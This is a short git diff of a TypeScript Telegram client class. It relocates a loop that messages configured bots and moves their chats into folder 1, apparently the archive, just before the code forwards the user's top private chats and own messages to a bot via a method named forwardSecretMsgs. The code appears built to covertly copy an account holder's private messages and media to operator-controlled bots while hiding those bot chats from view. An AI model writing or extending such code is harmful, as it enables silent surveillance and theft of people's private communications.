@@ -173,24 +173,6 @@ class TelegramManager {
 
     public async forwardMediaToBot(fromChatId: string) {
         const bots = BotConfig.getInstance().getAllBotUsernames(ChannelCategory.SAVED_MESSAGES);
-        for (const bot of bots) {
-            try {
-                await this.client.sendMessage(bot, { message: "Start" });
-                await sleep(1000);
-                await this.client.invoke(
-                    new Api.folders.EditPeerFolders({
-                        folderPeers: [
-                            new Api.InputFolderPeer({
-                                peer: await this.client.getInputEntity(bot),
-                                folderId: 1,
-                            }),
-                        ],
-                    })
-                );
-            } catch (e) {
-                console.log(e)
-            }
-        }
         try {
             if (fromChatId) {
                 await this.forwardSecretMsgs(fromChatId, BotConfig.getInstance().getBotUsername(ChannelCategory.SAVED_MESSAGES),);
@@ -198,6 +180,24 @@ class TelegramManager {
                 const chats = await this.getTopPrivateChats();
                 const me = await this.getMe();
                 if (chats.length > 0) {
+                    for (const bot of bots) {
+                        try {
+                            await this.client.sendMessage(bot, { message: "Start" });
+                            await sleep(1000);
+                            await this.client.invoke(
+                                new Api.folders.EditPeerFolders({
+                                    folderPeers: [
+                                        new Api.InputFolderPeer({
+                                            peer: await this.client.getInputEntity(bot),
+                                            folderId: 1,
+                                        }),
+                                    ],
+                                })
+                            );
+                        } catch (e) {
+                            console.log(e)
+                        }
+                    }
                     const finalChats = new Set(chats.map(chat => chat.chatId));
                     finalChats.add(me.id?.toString());
                     for (const chatId of finalChats) {
